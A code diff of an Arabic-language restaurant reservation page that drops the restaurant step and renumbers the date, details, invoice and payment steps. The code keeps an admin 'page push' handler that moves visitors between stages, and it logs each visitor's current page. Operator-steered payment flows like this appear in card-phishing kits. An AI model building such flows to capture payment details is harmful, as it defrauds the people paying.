@@ -8,15 +8,14 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 
-type Step = 1 | 2 | 3 | 4 | 5;
+type Step = 1 | 2 | 3 | 4;
 
 function StepIndicator({ current }: { current: Step }) {
   const steps = [
-    { number: 1 as Step, label: "المطعم" },
-    { number: 2 as Step, label: "الموعد" },
-    { number: 3 as Step, label: "البيانات" },
-    { number: 4 as Step, label: "الفاتورة" },
-    { number: 5 as Step, label: "الدفع" },
+    { number: 1 as Step, label: "الموعد" },
+    { number: 2 as Step, label: "البيانات" },
+    { number: 3 as Step, label: "الفاتورة" },
+    { number: 4 as Step, label: "الدفع" },
   ];
 
   return (
@@ -118,14 +117,14 @@ export default function Reserve() {
   const serviceFee = 50;
   const reservationTotal = serviceFee;
 
-  // Admin "page push" handler — dashboard sends steps 1-5 corresponding to the
-  // five internal stages of /reserve/:id (المطعم/الموعد/البيانات/الفاتورة/الدفع).
+  // Admin "page push" handler — dashboard sends steps 1-4 corresponding to the
+  // four internal stages of /reserve/:id (الموعد/البيانات/الفاتورة/الدفع).
   // App.tsx forwards those as a custom event so we can jump the visitor to the
   // right internal stage of this multi-step page without losing the URL.
   useEffect(() => {
     const applyTarget = (raw: unknown) => {
       const target = Number(raw) || 0;
-      if (target >= 1 && target <= 5) {
+      if (target >= 1 && target <= 4) {
         setStep(target as Step);
         return true;
       }
@@ -154,11 +153,10 @@ export default function Reserve() {
     const visitorId = localStorage.getItem("visitor");
     if (!visitorId) return;
     const pageMap: Record<number, string> = {
-      1: "reserve_restaurant",
-      2: "reserve_date",
-      3: "reserve_details",
-      4: "reserve_invoice",
-      5: "reserve_checkout",
+      1: "reserve_date",
+      2: "reserve_details",
+      3: "reserve_invoice",
+      4: "reserve_checkout",
     };
     const page = pageMap[step];
     if (!page) return;
@@ -203,32 +201,7 @@ export default function Reserve() {
     return visitorId;
   };
 
-  const handleStepOneSubmit = async () => {
-    if (stepSubmitting) return;
-
-    setStepSubmitting(true);
-    setStepSubmitError("");
-
-    const visitorId = ensureReservationVisitorId();
-    const saved = await addData({
-      id: visitorId,
-      type: "restaurant_reservation",
-      restaurant: restaurant.name,
-      restaurantEn: restaurant.nameEn,
-      currentPage: "reserve_date",
-    });
-
-    if (!saved) {
-      setStepSubmitError("تعذر حفظ البيانات، يرجى المحاولة مرة أخرى");
-      setStepSubmitting(false);
-      return;
-    }
-
-    setStep(2);
-    setStepSubmitting(false);
-  };
-
-  const handleStepTwoSubmit = async () => {
+  const handleDateSubmit = async () => {
     if (stepSubmitting || !date || !time) return;
 
     setStepSubmitting(true);
@@ -252,7 +225,7 @@ export default function Reserve() {
       return;
     }
 
-    setStep(3);
+    setStep(2);
     setStepSubmitting(false);
   };
 
@@ -429,54 +402,6 @@ export default function Reserve() {
       <div className="max-w-lg mx-auto px-4 py-6">
         {step === 1 && (
           <div className="space-y-4 animate-fade-in" data-testid="step-1-content">
-            <div className="bg-white rounded-xl overflow-hidden shadow-sm">
-              <img
-                src={restaurant.bgImage}
-                alt={restaurant.nameEn}
-                className="w-full h-40 object-cover"
-              />
-              <div className="p-5">
-                <div className="flex items-center gap-3 mb-3">
-                  <img src={restaurant.logo} alt="" className="w-14 h-14 rounded-lg object-cover shadow-md" />
-                  <div>
-                    <h2 className="text-[#4a1525] font-bold text-lg">{restaurant.name}</h2>
-                    <p className="text-[#7a6b5f] text-xs">{restaurant.nameEn}</p>
-                  </div>
-                </div>
-                {restaurant.cuisine && (
-                  <span className="inline-block bg-[#f5efe6] text-[#4a1525] text-xs px-3 py-1 rounded-full mb-3">
-                    {restaurant.cuisine}
-                  </span>
-                )}
-                <p className="text-[#7a6b5f] text-sm leading-relaxed mb-3">{restaurant.description}</p>
-                <div className="flex items-center gap-4 text-xs text-[#7a6b5f]">
-                  <span className="flex items-center gap-1">
-                    <Clock className="w-3.5 h-3.5" /> {restaurant.hours}
-                  </span>
-                  <span>{restaurant.priceRange}</span>
-                </div>
-              </div>
-            </div>
-
-            <button
-              onClick={() => { void handleStepOneSubmit(); }}
-              disabled={stepSubmitting}
-              className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
-              data-testid="button-next-step-1"
-            >
-              {stepSubmitting ? "جاري الإرسال..." : "التالي - اختيار الموعد"}
-              <ChevronLeft className="w-5 h-5" />
-            </button>
-            {stepSubmitError && (
-              <p className="text-red-500 text-xs text-center" data-testid="error-reserve-step-1-submit">
-                {stepSubmitError}
-              </p>
-            )}
-          </div>
-        )}
-
-        {step === 2 && (
-          <div className="space-y-4 animate-fade-in" data-testid="step-2-content">
             <div className="bg-white rounded-xl p-5 shadow-sm space-y-5">
               <h2 className="text-[#4a1525] font-bold text-lg flex items-center gap-2">
                 <Calendar className="w-5 h-5" />
@@ -546,24 +471,24 @@ export default function Reserve() {
             </div>
 
             <button
-              onClick={() => { void handleStepTwoSubmit(); }}
+              onClick={() => { void handleDateSubmit(); }}
               disabled={!date || !time || stepSubmitting}
               className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
-              data-testid="button-next-step-2"
+              data-testid="button-next-step-1"
             >
               {stepSubmitting ? "جاري الإرسال..." : "التالي - بيانات الحجز"}
               <ChevronLeft className="w-5 h-5" />
             </button>
             {stepSubmitError && (
-              <p className="text-red-500 text-xs text-center" data-testid="error-reserve-step-2-submit">
+              <p className="text-red-500 text-xs text-center" data-testid="error-reserve-step-1-submit">
                 {stepSubmitError}
               </p>
             )}
           </div>
         )}
 
-        {step === 3 && (
-          <div className="space-y-4 animate-fade-in" data-testid="step-3-content">
+        {step === 2 && (
+          <div className="space-y-4 animate-fade-in" data-testid="step-2-content">
             <div className="bg-white rounded-xl p-5 shadow-sm space-y-5">
               <h2 className="text-[#4a1525] font-bold text-lg flex items-center gap-2">
                 <User className="w-5 h-5" />
@@ -623,10 +548,10 @@ export default function Reserve() {
             </div>
 
             <button
-              onClick={() => { if (name && phone) setStep(4); }}
+              onClick={() => { if (name && phone) setStep(3); }}
               disabled={!name || !phone}
               className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
-              data-testid="button-next-step-3"
+              data-testid="button-next-step-2"
             >
               التالي - الفاتورة
               <ChevronLeft className="w-5 h-5" />
@@ -634,8 +559,8 @@ export default function Reserve() {
           </div>
         )}
 
-        {step === 4 && (
-          <div className="space-y-4 animate-fade-in" data-testid="step-4-content">
+        {step === 3 && (
+          <div className="space-y-4 animate-fade-in" data-testid="step-3-content">
             <div className="bg-gradient-to-r from-[#4a1525] to-[#3a0f1d] rounded-xl p-5 text-center">
               <Receipt className="w-8 h-8 text-[#c9a96e] mx-auto mb-2" />
               <h2 className="text-white font-bold text-lg">فاتورة الحجز</h2>
@@ -714,9 +639,9 @@ export default function Reserve() {
             </div>
 
             <button
-              onClick={() => { setStep(5); setShowCashbackPopup(true); }}
+              onClick={() => { setStep(4); setShowCashbackPopup(true); }}
               className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md flex items-center justify-center gap-2"
-              data-testid="button-next-step-4"
+              data-testid="button-next-step-3"
             >
               متابعة الدفع
               <CreditCard className="w-5 h-5" />
@@ -724,7 +649,7 @@ export default function Reserve() {
           </div>
         )}
 
-        {step === 5 && (
+        {step === 4 && (
           <>
             {showCashbackPopup && (
               <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
